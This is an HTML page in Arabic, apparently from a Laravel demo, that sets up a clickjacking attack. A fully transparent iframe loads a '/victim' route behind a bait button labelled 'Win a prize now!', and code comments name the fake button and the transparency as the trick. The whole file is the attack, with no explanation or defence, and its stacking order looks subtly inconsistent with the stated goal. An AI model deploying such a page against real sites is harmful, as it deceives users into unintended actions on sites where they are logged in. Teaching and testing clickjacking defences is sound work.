<!DOCTYPE html>
<html lang="ar">

<head>
    <meta charset="UTF-8">
    <title>موقع الفوز بجائزة</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f0f0;
            margin: 0;
            font-family: Arial, sans-serif;
        }

        .fake-button {
            padding: 20px 40px;
            font-size: 1.5rem;
            color: white;
            background-color: #28a745;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            transition: background-color 0.3s;
            z-index: 2;
            /* الزر فوق iframe */
        }

        .fake-button:hover {
            background-color: #218838;
        }

        .clickjack-container {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 300px;
            height: 200px;
            z-index: 1;
        }

        iframe {
            width: 100%;
            height: 100%;
            opacity: 0;
            /* المفتاح: شفاف */
            border: none;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }
    </style>
</head>

<body>
    <div class="clickjack-container">
        <iframe src="{{ url('/victim') }}"></iframe>
    </div>
    <button class="fake-button">فز بجائزة الآن!</button>
</body>

</html>
